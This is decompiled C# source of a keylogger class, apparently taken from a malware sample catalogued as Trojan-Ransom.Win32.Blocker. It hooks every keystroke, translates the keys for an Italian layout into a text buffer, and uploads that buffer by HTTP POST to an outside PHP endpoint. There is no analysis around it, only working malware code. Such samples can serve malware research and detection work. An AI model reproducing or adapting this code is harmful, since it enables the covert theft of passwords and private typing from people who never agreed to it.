// Decompiled with JetBrains decompiler
// Type: WinSVCK.Writer
// Assembly: WinSVCK, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B0D6F5B2-514B-4F62-93E4-C7CA05F99D0C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.ayqv-6502fb3dd2ed68ca3220cbb988b0c5b4a5bcabb3.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Specialized;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace WinSVCK
{
  public class Writer
  {
    [AccessedThroughProperty("kbHook")]
    private KeyboardHook _kbHook;
    private string bufferString;
    private bool maiusc;
    private bool ctrl;
    private bool alt;
    private bool altgr;

    public Writer()
    {
      this.kbHook = new KeyboardHook();
      this.bufferString = "";
      this.maiusc = Control.IsKeyLocked(Keys.Capital);
    }

    private virtual KeyboardHook kbHook
    {
      get => this._kbHook;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        KeyboardHook.KeyUpEventHandler keyUpEventHandler = new KeyboardHook.KeyUpEventHandler(this.kbHook_KeyUp);
        KeyboardHook.KeyDownEventHandler downEventHandler = new KeyboardHook.KeyDownEventHandler(this.kbHook_KeyDown);
        if (this._kbHook != null)
        {
          KeyboardHook.KeyUp -= keyUpEventHandler;
          KeyboardHook.KeyDown -= downEventHandler;
        }
        this._kbHook = value;
        if (this._kbHook == null)
          return;
        KeyboardHook.KeyUp += keyUpEventHandler;
        KeyboardHook.KeyDown += downEventHandler;
      }
    }

    private void kbHook_KeyDown(Keys Key)
    {
      switch (Key)
      {
        case Keys.Return:
          break;
        case Keys.Space:
          this.bufferString += " ";
          break;
        case Keys.LWin:
          break;
        case Keys.RWin:
          break;
        case Keys.LShiftKey:
          this.maiusc = true;
          break;
        case Keys.RShiftKey:
          this.maiusc = true;
          break;
        case Keys.LControlKey:
          this.ctrl = true;
          break;
        case Keys.RControlKey:
          this.ctrl = true;
          break;
        case Keys.RMenu:
          this.altgr = true;
          break;
        case Keys.Alt:
          this.alt = true;
          break;
        default:
          if (this.maiusc & !this.altgr)
          {
            switch (Key)
            {
              case Keys.D0:
                this.bufferString += "=";
                return;
              case Keys.D1:
                this.bufferString += "!";
                return;
              case Keys.D2:
                this.bufferString += "\"";
                return;
              case Keys.D3:
                this.bufferString += "£";
                return;
              case Keys.D4:
                this.bufferString += "$";
                return;
              case Keys.D5:
                this.bufferString += "%";
                return;
              case Keys.D6:
                this.bufferString += "&";
                return;
              case Keys.D7:
                this.bufferString += "/";
                return;
              case Keys.D8:
                this.bufferString += "(";
                return;
              case Keys.D9:
                this.bufferString += ")";
                return;
              case Keys.A:
              case Keys.B:
              case Keys.C:
              case Keys.D:
              case Keys.E:
              case Keys.F:
              case Keys.G:
              case Keys.H:
              case Keys.I:
              case Keys.J:
              case Keys.K:
              case Keys.L:
              case Keys.M:
              case Keys.N:
              case Keys.O:
              case Keys.P:
              case Keys.Q:
              case Keys.R:
              case Keys.S:
              case Keys.T:
              case Keys.U:
              case Keys.V:
              case Keys.W:
              case Keys.X:
              case Keys.Y:
              case Keys.Z:
                this.bufferString += Key.ToString();
                return;
              case Keys.OemSemicolon:
                this.bufferString += "é";
                return;
              case Keys.Oemplus:
                this.bufferString += "*";
                return;
              case Keys.Oemcomma:
                this.bufferString += ";";
                return;
              case Keys.OemMinus:
                this.bufferString += "_";
                return;
              case Keys.OemPeriod:
                this.bufferString += ":";
                return;
              case Keys.OemQuestion:
                this.bufferString += "§";
                return;
              case Keys.Oemtilde:
                this.bufferString += "ç";
                return;
              case Keys.OemOpenBrackets:
                this.bufferString += "?";
                return;
              case Keys.OemPipe:
                this.bufferString += "|";
                return;
              case Keys.OemCloseBrackets:
                this.bufferString += "^";
                return;
              case Keys.OemQuotes:
                this.bufferString += "°";
                return;
              case Keys.OemBackslash:
                this.bufferString += ">";
                return;
              default:
                this.bufferString = this.bufferString + "<SHIFT+" + Key.ToString() + ">";
                return;
            }
          }
          else if (this.maiusc & this.altgr)
          {
            switch (Key)
            {
              case Keys.OemSemicolon:
                this.bufferString += "{";
                return;
              case Keys.Oemplus:
                this.bufferString += "}";
                return;
              default:
                this.bufferString = this.bufferString + "<SHIFT+ALTGR+" + Key.ToString() + ">";
                return;
            }
          }
          else if (this.altgr)
          {
            switch (Key)
            {
              case Keys.OemSemicolon:
                this.bufferString += "[";
                return;
              case Keys.Oemplus:
                this.bufferString += "]";
                return;
              case Keys.Oemtilde:
                this.bufferString += "@";
                return;
              case Keys.OemQuotes:
                this.bufferString += "#";
                return;
              default:
                this.bufferString = this.bufferString + "<ALTGR+" + Key.ToString() + ">";
                return;
            }
          }
          else
          {
            if (this.ctrl)
            {
              this.bufferString = this.bufferString + "<CTRL+" + Key.ToString() + ">";
              break;
            }
            switch (Key)
            {
              case Keys.D0:
              case Keys.NumPad0:
                this.bufferString += "0";
                return;
              case Keys.D1:
              case Keys.NumPad1:
                this.bufferString += "1";
                return;
              case Keys.D2:
              case Keys.NumPad2:
                this.bufferString += "2";
                return;
              case Keys.D3:
              case Keys.NumPad3:
                this.bufferString += "3";
                return;
              case Keys.D4:
              case Keys.NumPad4:
                this.bufferString += "4";
                return;
              case Keys.D5:
              case Keys.NumPad5:
                this.bufferString += "5";
                return;
              case Keys.D6:
              case Keys.NumPad6:
                this.bufferString += "6";
                return;
              case Keys.D7:
              case Keys.NumPad7:
                this.bufferString += "7";
                return;
              case Keys.D8:
              case Keys.NumPad8:
                this.bufferString += "8";
                return;
              case Keys.D9:
              case Keys.NumPad9:
                this.bufferString += "9";
                return;
              case Keys.A:
              case Keys.B:
              case Keys.C:
              case Keys.D:
              case Keys.E:
              case Keys.F:
              case Keys.G:
              case Keys.H:
              case Keys.I:
              case Keys.J:
              case Keys.K:
              case Keys.L:
              case Keys.M:
              case Keys.N:
              case Keys.O:
              case Keys.P:
              case Keys.Q:
              case Keys.R:
              case Keys.S:
              case Keys.T:
              case Keys.U:
              case Keys.V:
              case Keys.W:
              case Keys.X:
              case Keys.Y:
              case Keys.Z:
                this.bufferString += Key.ToString().ToLower();
                return;
              case Keys.OemSemicolon:
                this.bufferString += "è";
                return;
              case Keys.Oemplus:
                this.bufferString += "+";
                return;
              case Keys.Oemcomma:
                this.bufferString += ",";
                return;
              case Keys.OemMinus:
                this.bufferString += "-";
                return;
              case Keys.OemPeriod:
                this.bufferString += ".";
                return;
              case Keys.OemQuestion:
                this.bufferString += "ù";
                return;
              case Keys.Oemtilde:
                this.bufferString += "ò";
                return;
              case Keys.OemOpenBrackets:
                this.bufferString += "'";
                return;
              case Keys.OemPipe:
                this.bufferString += "\\";
                return;
              case Keys.OemCloseBrackets:
                this.bufferString += "ì";
                return;
              case Keys.OemQuotes:
                this.bufferString += "à";
                return;
              case Keys.OemBackslash:
                this.bufferString += "<";
                return;
              default:
                this.bufferString = this.bufferString + "<" + Key.ToString() + ">";
                return;
            }
          }
      }
    }

    private void kbHook_KeyUp(Keys Key)
    {
      switch (Key)
      {
        case Keys.Tab:
          this.bufferString += "<TAB>";
          break;
        case Keys.Return:
          this.bufferString += "\r\n";
          break;
        case Keys.Capital:
          this.maiusc = !this.maiusc;
          break;
        case Keys.LWin:
          this.bufferString += "<WIN>";
          break;
        case Keys.RWin:
          this.bufferString += "<WIN>";
          break;
        case Keys.LShiftKey:
          this.maiusc = false;
          break;
        case Keys.RShiftKey:
          this.maiusc = false;
          break;
        case Keys.LControlKey:
          this.ctrl = false;
          break;
        case Keys.RControlKey:
          this.ctrl = false;
          break;
        case Keys.RMenu:
          this.altgr = false;
          break;
        case Keys.Alt:
          this.alt = false;
          break;
      }
    }

    public void forceFlush(bool closing)
    {
      string bufferString = this.bufferString;
      try
      {
        this.bufferString = "";
        using (WebClient webClient = new WebClient())
          new UTF8Encoding().GetString(webClient.UploadValues("http://gicos.altervista.org/save.php", "POST", new NameValueCollection()
          {
            {
              "val",
              bufferString
            }
          }));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.bufferString = bufferString + this.bufferString;
        ProjectData.ClearProjectError();
      }
    }
  }
}
